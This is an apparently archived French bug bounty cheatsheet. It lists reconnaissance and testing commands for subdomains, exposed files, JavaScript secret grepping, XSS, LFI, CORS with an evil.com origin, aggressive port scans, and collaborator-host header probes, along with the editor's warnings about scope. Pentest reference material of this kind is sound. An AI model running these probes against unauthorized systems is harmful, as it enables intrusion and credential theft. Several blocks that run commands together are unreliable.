---
title: Bug Bounty
description: Cheatsheet Bug Bounty issue du toolkit archivé Lostsec.
aside: true
prev: false
next: false
---

# Bug Bounty

Cheatsheet technique classée par sujet : 35 blocs extraits du fichier Advanced Bug Hunting Toolkit, capture du 28 août 2025.

[Lostsec - archive originale](https://web.archive.org/web/20250828093634/https://lostsec.xyz/)

Les commandes reproduisent les exemples historiques de la capture ; leur fonctionnement et leur compatibilité avec les versions actuelles des outils n'ont pas été validés. Les blocs manifestement incomplets sont signalés. Utilisation uniquement dans un laboratoire ou dans le périmètre explicitement autorisé d'un programme Bug Bounty. Vérifier les limites de débit, les permissions et les fichiers nécessaires avant tout test.

## Cheatsheet

## Énumération des sous-domaines

### Découverte des sous-domaines

```bash
subfinder -d example.com -all -recursive > subexample.com.txt
```

Effectue une recherche récursive avec Subfinder et enregistre les résultats.

### Filtrage des sous-domaines actifs

```bash
cat subexample.com.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subexample.coms_alive.txt
```

Vérifie les réponses HTTP sur plusieurs ports et enregistre les hôtes répondants.

> La commande emploie une concurrence élevée. Respecter les limites du programme.

### Vérification du risque de Subdomain Takeover

```bash
subzy run --targets subexample.coms.txt --concurrency 100 --hide_fails --verify_ssl
```

Recherche des configurations potentiellement vulnérables avec Subzy.

> Le fichier d'entrée ne porte pas le même nom que celui créé par Subfinder dans le bloc précédent.

## Collecte des URL

### Collecte passive avec Katana

```bash
katana -u subexample.coms_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
```

Collecte des URL depuis des archives et d'autres sources, en excluant certaines extensions.

### Collecte avancée avec Katana

```bash
echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txtkatana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txtcat output.txt | sed 's/=.*/=/' >final.txt
```

Bloc de collecte et de déduplication des URL paramétrées.

> Le fichier MHT concatène plusieurs commandes sans séparateurs. Bloc conservé comme archive, non exécutable en l'état.

### Collecte avec GAU

```bash
echo example.com | gau --mc 200 | urldedupe >urls.txtcat urls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sort > output.txtcat output.txt | sed 's/=.*/=/' >final.txt
```

Bloc de collecte et de filtrage des URL par extension et paramètres.

> Le fichier MHT concatène plusieurs commandes sans séparateurs. Bloc conservé comme archive, non exécutable en l'état.

## Exposition de données

### Repérage de fichiers sensibles

```bash
cat allurls.txt | grep -E "\.xls|\.xml|\.xlsx|\.json|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar\.gz|\.tgz|\.bak|\.7z|\.rar|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.gz|\.config|\.csv|\.yaml|\.md|\.md5"
```

Filtre une liste d'URL selon des extensions pouvant indiquer des fichiers exposés.

### Recherche de documents indexés

```text
site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)
```

Requête de moteur de recherche filtrant les extensions de documents dans le périmètre autorisé.

### Détection de dépôts Git exposés

```bash
cat example.coms.txt | grep "SUCCESS" | gf urls | httpx-toolkit -sc -server -cl -path "/.git/" -mc 200 -location -ms "Index of" -probe
```

Vérifie des réponses HTTP pouvant révéler un répertoire Git.

### Filtrage étendu des extensions sensibles

```bash
echo https://example.com | gau | grep -E "\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|config|csv|yaml|md|md5|tar|xz|7zip|p12|pem|key|crt|csr|sh|pl|py|java|class|jar|war|ear|sqlitedb|sqlite3|dbf|db3|accdb|mdb|sqlcipher|gitignore|env|ini|conf|properties|plist|cfg)$"
```

Recherche des extensions de fichiers potentiellement sensibles dans les URL collectées.

### Recherche de buckets AWS S3

```bash
s3scanner scan -d example.com
```

Recherche des buckets associés au domaine indiqué.

### Recherche de secrets dans des fichiers JavaScript

```bash
cat allurls.txt | grep -E "\.js$" | httpx-toolkit -mc 200 -content-type | grep -E "application/javascript|text/javascript" | cut -d' ' -f1 | xargs -I% curl -s % | grep -E "(API_KEY|api_key|apikey|secret|token|password)"
```

Bloc historique recherchant des marqueurs de secrets dans les fichiers JavaScript. Traiter les résultats comme des indices, sans utiliser les secrets trouvés.

## Cross-Site Scripting (XSS)

### Collecte de candidats XSS

```bash
echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
```

Chaîne d'outils pour repérer des paramètres candidats à une vérification XSS.

### Analyse XSS avec Dalfox

```bash
cat xss_params.txt | dalfox pipe --blind https://your-collaborator-url --waf-bypass --silence
```

Commande Dalfox historique pour tester des paramètres dans un lab.

> Les options et l'autorisation de tester doivent être vérifiées ; l'archive ne démontre pas la validité de la commande.

### Recherche de candidats XSS persistants

```bash
cat urls.txt | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
```

Filtre des URL de formulaires et lance des modèles de détection XSS.

> Ce filtrage ne démontre pas qu'une XSS est persistante.

### Recherche de candidats DOM XSS

```bash
cat js_files.txt | Gxss -c 100 | sort -u | dalfox pipe -o dom_xss_results.txt
```

Combine Gxss et Dalfox sur une liste de fichiers JavaScript.

> Le résultat n'établit pas à lui seul une DOM XSS.

## Local File Inclusion (LFI)

### Recherche de LFI

```bash
echo "https://example.com/" | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
```

Bloc historique de test LFI avec une liste de charges de test et FFUF.

## Cross-Origin Resource Sharing (CORS)

### Vérification des en-têtes CORS

```bash
curl -H "Origin: http://example.com" -I https://example.com/wp-json/
```

Observe les en-têtes renvoyés pour une requête contenant Origin.

### Analyse avec CORScanner

```bash
python3 CORScanner.py -u https://example.com -d -t 10
```

Recherche des configurations CORS potentiellement incorrectes.

### Détection CORS avec Nuclei

```bash
cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
```

Applique des modèles de détection CORS à des hôtes répondants.

### Vérification de la réflexion d'Origin

```bash
curl -H "Origin: https://evil.com" -I https://example.com/api/data | grep -i "access-control-allow-origin: https://evil.com"
```

Vérifie si un en-tête de réponse reflète l'origine envoyée.

> La réflexion seule ne suffit pas à démontrer une vulnérabilité exploitable.

## WordPress

### Analyse WordPress avec WPScan

```bash
wpscan --url https://example.com --disable-tls-checks --api-token YOUR_TOKEN -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force
```

Commande historique d'énumération WordPress et de recherche de vulnérabilités.

> Mode agressif et vérification TLS désactivée dans l'original. Ne pas utiliser tel quel hors d'un lab adapté.

## Scan réseau

### Inventaire des ports avec Naabu

```bash
naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt
```

Associe Naabu et Nmap pour identifier des ports et services.

### Scan complet avec Nmap

```bash
nmap -p- --min-rate 1000 -T4 -A example.com -oA fullscan
```

Analyse l'ensemble des ports TCP et collecte des informations sur les services.

> Débit et options intrusives à vérifier selon les règles du programme.

### Scan avec Masscan

```bash
masscan -p0-65535 example.com --rate 100000 -oG masscan-results.txt
```

Exemple historique de scan de ports à débit très élevé.

> Débit extrêmement élevé dans l'original ; ne pas exécuter sur des systèmes tiers.

## Découverte de paramètres

### Recherche passive avec Arjun

```bash
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers "User-Agent: Mozilla/5.0"
```

Recherche des paramètres HTTP avec le mode passif d'Arjun.

### Recherche avec une wordlist Arjun

```bash
arjun -u https://example.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers "User-Agent: Mozilla/5.0"
```

Teste des noms de paramètres provenant d'une liste de mots.

## Analyse JavaScript

### Collecte et analyse des fichiers JS

```bash
echo example.com | katana -d 5 | grep -E "\.js$" | nuclei -t /path/to/nuclei-templates/http/exposures/ -c 30
```

Collecte des URL JavaScript et applique des modèles d'exposition Nuclei.

### Analyse d'une liste de fichiers JS

```bash
cat alljs.txt | nuclei -t /path/to/nuclei-templates/http/exposures/
```

Applique des modèles Nuclei à une liste de fichiers JavaScript collectés.

## Filtrage des types de contenu

### Filtrage du contenu HTML

```bash
echo example.com | gau | grep -Eo '(\/[^\/]+)\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'
```

Bloc historique de recherche d'extensions de pages et de filtrage du type MIME.

> Le filtrage extrait des chemins au lieu d'URL complètes ; le fonctionnement n'est pas garanti.

### Filtrage du contenu JavaScript

```bash
echo example.com | gau | grep '\.js-php-jsp-other extens$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
```

Bloc historique de filtrage du type MIME JavaScript.

> Expression de filtrage manifestement incomplète dans la source ; non exécutable comme méthode fiable.

## Shodan

### Recherche par certificat TLS

```text
Ssl.cert.subject.CN:"example.com" 200
```

Requête Shodan historique fondée sur le nom commun d'un certificat.

## FFUF avec fichier de requête

### Test LFI à partir d'une requête

```bash
ffuf -request lfi -request-proto https -w /root/wordlists/offensive\ payloads/LFI\ payload.txt -c -mr "root:"
```

Charge une requête HTTP enregistrée et applique une liste de tests LFI.

### Test XSS à partir d'une requête

```bash
ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr "<script>alert('XSS')</script>"
```

Charge une requête HTTP enregistrée et applique une liste de tests XSS.

## Techniques avancées

### Tests d'en-têtes XSS / SSRF

```bash
cat example.coms.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ""\n";done
```

Bloc historique combinant des requêtes et des vérifications d'en-têtes. Réservé aux environnements de test contrôlés.

> Bloc non vérifié, avec un nom Collaborator mal orthographié et des hypothèses non démontrées.

## Méthodologies complémentaires

Les huit fiches suivantes sont identifiables dans le fichier MHT, mais leur contenu interactif n'a pas été enregistré. Aucun bloc de commandes n'a été inventé pour les compléter.

- Advanced Recon Methodology
- Gather assets through API
- SSTI Payloads
- CRLF Injection
- SQL Injection Methodology
- XSS WAF Bypass Methodology
- SQL Injection XOR WAF Bypass
- Advanced Google Dorks
